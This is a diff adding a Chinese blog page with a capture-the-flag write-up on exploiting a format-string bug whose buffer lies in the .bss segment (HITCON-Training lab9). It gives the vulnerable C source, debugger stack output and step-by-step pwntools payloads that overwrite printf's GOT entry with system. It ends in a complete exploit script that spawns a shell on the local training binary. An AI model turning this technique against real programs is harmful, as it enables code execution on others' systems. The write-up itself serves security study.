@@ -1,0 +1,240 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>格式化字符串在bss段的利用 | Evylnk</title><meta name="author" content="Evylnk"><meta name="copyright" content="Evylnk"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="相比格式化字符串在栈上，这种情况的利用要复杂很多，更多的是要分步去改写对应的值 这里以HITCON—Training lab9为例，这是一道很经典的题目 参考星盟v1ctor师傅讲解 v1ctor师傅在视频里的exp，在我这打不通，我试了下，应该是字节写入的问题，有地方可能没改完全。 23R3F师傅 源码 #include &lt;stdio.h&gt;#include &lt;unistd.h&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串在bss段的利用">
+<meta property="og:url" content="http://emion.fun/2022/02/12/fmt_bss/index.html">
+<meta property="og:site_name" content="Evylnk">
+<meta property="og:description" content="相比格式化字符串在栈上，这种情况的利用要复杂很多，更多的是要分步去改写对应的值 这里以HITCON—Training lab9为例，这是一道很经典的题目 参考星盟v1ctor师傅讲解 v1ctor师傅在视频里的exp，在我这打不通，我试了下，应该是字节写入的问题，有地方可能没改完全。 23R3F师傅 源码 #include &lt;stdio.h&gt;#include &lt;unistd.h&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg">
+<meta property="article:published_time" content="2022-02-12T14:14:08.944Z">
+<meta property="article:modified_time" content="2022-02-12T15:32:17.707Z">
+<meta property="article:author" content="Evylnk">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="http://emion.fun/2022/02/12/fmt_bss/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '格式化字符串在bss段的利用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-12 23:32:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s3.bmp.ovh/imgs/2021/12/3a87cf2a04828f2b.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Evylnk</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">格式化字符串在bss段的利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-12T14:14:08.944Z" title="发表于 2022-02-12 22:14:08">2022-02-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-12T15:32:17.707Z" title="更新于 2022-02-12 23:32:17">2022-02-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="格式化字符串在bss段的利用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>相比格式化字符串在栈上，这种情况的利用要复杂很多，更多的是要分步去改写对应的值</strong></p>
+<p><strong>这里以HITCON—Training lab9为例，这是一道很经典的题目</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1uK411w72E?spm_id_from=333.999.0.0">参考星盟v1ctor师傅讲解</a></strong></p>
+<p><strong>v1ctor师傅在视频里的exp，在我这打不通，我试了下，应该是字节写入的问题，有地方可能没改完全。</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3902#toc-11">23R3F师傅</a></strong></p>
+<p><strong>源码</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>] ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_fmt</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		read(<span class="number">0</span>,buf,<span class="number">200</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(buf,<span class="string">&quot;quit&quot;</span>,<span class="number">4</span>))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">printf</span>(buf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  Magic echo Server&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">	do_fmt();</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	play();</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>printf(buf)</code>有明显的格式化字符串漏洞，并且，从源码里就可以看到buf是存在bss段而不是栈上</strong></p>
+<p><strong>gdb调试，断点下在printf上</strong></p>
+<p><strong>根据上面两位师傅的讲解我们知道能够利用把漏洞利用串起来，从bss段改到栈上的跳板，就下面四条，偏移为6，7，10，11.</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">06</span>:<span class="number">0018</span>│ ebp <span class="number">0xffffd458</span> —▸ <span class="number">0xffffd468</span> —▸ <span class="number">0xffffd478</span> ◂— <span class="number">0x0</span> <span class="comment">//这个</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│     <span class="number">0xffffd45c</span> —▸ <span class="number">0x8048584</span> (play+<span class="number">59</span>) ◂— nop    <span class="comment">//这个</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│     <span class="number">0xffffd460</span> —▸ <span class="number">0xf7fbdd80</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│     <span class="number">0xffffd464</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0028</span>│     <span class="number">0xffffd468</span> —▸ <span class="number">0xffffd478</span> ◂— <span class="number">0x0</span><span class="comment">//这个</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">002</span>c│     <span class="number">0xffffd46c</span> —▸ <span class="number">0x80485b1</span> (main+<span class="number">42</span>) ◂— nop <span class="comment">//这个</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h1><p><strong>首先先利用漏洞泄漏地址，把上面四条要用的都找出来</strong></p>
+<p><strong>payload</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">paylaod = <span class="string">&#x27;aaaa%6$p&#x27;</span></span><br><span class="line">sl(paylaod)</span><br><span class="line">ru(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">ebp_content = <span class="built_in">int</span>(rv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">ebp_base = ebp_content - <span class="number">0x10</span></span><br><span class="line">step1 = ebp_content - <span class="number">0xc</span></span><br><span class="line">step2 = ebp_content + <span class="number">0x4</span></span><br><span class="line">ms(<span class="string">&quot;ebp_content&quot;</span>, ebp_content)</span><br><span class="line">ms(<span class="string">&quot;ebp_base&quot;</span>, ebp_base)</span><br><span class="line">ms(<span class="string">&quot;ebp_content-0xc&quot;</span>, step1)</span><br><span class="line">ms(<span class="string">&quot;main_offset&quot;</span>, step2)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h1><p><strong>接下来先把偏移6，7串起来，变成下面这样</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gzb3xyx2o7j319i060gnr.jpg"></p>
+<p><strong>接着就可以将play的低两位改成print_got</strong></p>
+<p><strong>payload</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(step1 &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">sl(payload1)</span><br><span class="line"><span class="comment">#raw_input(&#x27;&gt;&#x27;)</span></span><br><span class="line">rc()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(printf_got &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">sl(payload2)</span><br><span class="line">rc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    sd(<span class="string">&quot;lnk&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    data = rc()</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">&quot;lnk&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input(&#x27;&gt;&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h1><p><strong>我们的目的是</strong></p>
+<blockquote>
+<p>计算出system函数的地址 ,将system函数地址写入printf在got表的地址</p>
+</blockquote>
+<p><strong>所以我们先要泄漏出system的地址，无法直接泄漏，但是我们可以先利用格式化字符串漏洞泄漏printf的地址，然后通过偏移计算system</strong></p>
+<p><strong>payload</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">leak_printf = <span class="string">&#x27;aaaa%7$s&#x27;</span></span><br><span class="line">sl(leak_printf)</span><br><span class="line">ru(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">printf_addr = u32(rv(<span class="number">4</span>))</span><br><span class="line">ms(<span class="string">&quot;printf_addr&quot;</span>, printf_addr)</span><br><span class="line"></span><br><span class="line">system_addr = printf_addr - printf_off + system_libc</span><br><span class="line">ms(<span class="string">&quot;system&quot;</span>, system_addr)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h1><p><strong>将system地址写入printf所在got表的位置的具体做法就是，在偏移为7的位置改低位，在偏移为11的位置改高位</strong></p>
+<p><strong>因为无法直接改，所以我们又要通过跳板，就是最开始main那个跳板</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gzb50xqjv2j31iw060goc.jpg"></p>
+<p><strong>改为这样</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#raw_input(&#x27;&gt;&#x27;)</span></span><br><span class="line">payload3 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(step2 &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">sl(payload3)</span><br><span class="line">rc()</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((printf_got+<span class="number">2</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">sl(payload4)</span><br><span class="line">rc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    sd(<span class="string">&quot;lnk&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    data = rc()</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">&quot;lnk&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h1><p><strong>最后就是改printf地址为system，当再次调用printf函数的时候，就会通过got表找到system的地址，然后执行</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gzb5b5gvupj31kw06aju9.jpg"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload5 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(system_addr &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%7$hn&quot;</span></span><br><span class="line">payload5 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((system_addr &gt;&gt; <span class="number">16</span>) - (system_addr &amp; <span class="number">0xffff</span>)) + <span class="string">&quot;c%11$hn&quot;</span></span><br><span class="line">sl(payload5)</span><br><span class="line">rc()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    sd(<span class="string">&quot;lnk&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    data = rc()</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">&quot;lnk&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#raw_input(&#x27;&gt;&#x27;)</span></span><br><span class="line">sl(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p><strong>有个很奇怪的点，我必须要加上<code>context.log_level = &#39;debug&#39;</code>才能够打通，不然最后那个while会报错….</strong></p>
+<p><strong>很难绷得住💦</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./playfmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./playfmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : io.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : io.send(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> n : io.recv(n)</span><br><span class="line">rc = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> s : io.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ms</span>(<span class="params">name,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(name + <span class="string">&quot;----&gt;&quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">mallocr,PIE=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print &#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+mallocr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(mallocr)))</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_off = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">paylaod = <span class="string">&#x27;aaaa%6$p&#x27;</span></span><br><span class="line">sl(paylaod)</span><br><span class="line">ru(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">ebp_content = <span class="built_in">int</span>(rv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">ebp_base = ebp_content - <span class="number">0x10</span></span><br><span class="line">step1 = ebp_content - <span class="number">0xc</span></span><br><span class="line">step2 = ebp_content + <span class="number">0x4</span></span><br><span class="line">ms(<span class="string">&quot;ebp_content&quot;</span>, ebp_content)</span><br><span class="line">ms(<span class="string">&quot;ebp_base&quot;</span>, ebp_base)</span><br><span class="line">ms(<span class="string">&quot;ebp_content-0xc&quot;</span>, step1)</span><br><span class="line">ms(<span class="string">&quot;main_offset&quot;</span>, step2)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(step1 &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">sl(payload1)</span><br><span class="line"><span class="comment">#raw_input(&#x27;&gt;&#x27;)</span></span><br><span class="line">rc()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(printf_got &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">sl(payload2)</span><br><span class="line">rc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    sd(<span class="string">&quot;lnk&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    data = rc()</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">&quot;lnk&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input(&#x27;&gt;&#x27;)</span></span><br><span class="line">payload3 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(step2 &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">sl(payload3)</span><br><span class="line">rc()</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((printf_got+<span class="number">2</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">sl(payload4)</span><br><span class="line">rc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    sd(<span class="string">&quot;lnk&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    data = rc()</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">&quot;lnk&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">leak_printf = <span class="string">&#x27;aaaa%7$s&#x27;</span></span><br><span class="line">sl(leak_printf)</span><br><span class="line">ru(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">printf_addr = u32(rv(<span class="number">4</span>))</span><br><span class="line">ms(<span class="string">&quot;printf_addr&quot;</span>, printf_addr)</span><br><span class="line"></span><br><span class="line">system_addr = printf_addr - printf_off + system_libc</span><br><span class="line">ms(<span class="string">&quot;system&quot;</span>, system_addr)</span><br><span class="line">payload5 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(system_addr &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%7$hn&quot;</span></span><br><span class="line">payload5 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((system_addr &gt;&gt; <span class="number">16</span>) - (system_addr &amp; <span class="number">0xffff</span>)) + <span class="string">&quot;c%11$hn&quot;</span></span><br><span class="line">sl(payload5)</span><br><span class="line">rc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    sd(<span class="string">&quot;lnk&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    data = rc()</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">&quot;lnk&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">raw_input(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Evylnk</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://emion.fun/2022/02/12/fmt_bss/">http://emion.fun/2022/02/12/fmt_bss/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://emion.fun" target="_blank">Evylnk</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/02/10/attack/"><img class="next-cover" src="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CSAPP之Attack LAB</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s3.bmp.ovh/imgs/2021/12/3a87cf2a04828f2b.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Evylnk</div><div class="author-info__description">CTF && PWN && STUDENT</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LHXHL"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/LHXHL" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">愿你有一个灿烂的前程，愿你有情人终成眷属，愿你在尘世中收获幸福。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Step-1"><span class="toc-number">1.</span> <span class="toc-text">Step 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Step-2"><span class="toc-number">2.</span> <span class="toc-text">Step 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Step-3"><span class="toc-number">3.</span> <span class="toc-text">Step 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Step-4"><span class="toc-number">4.</span> 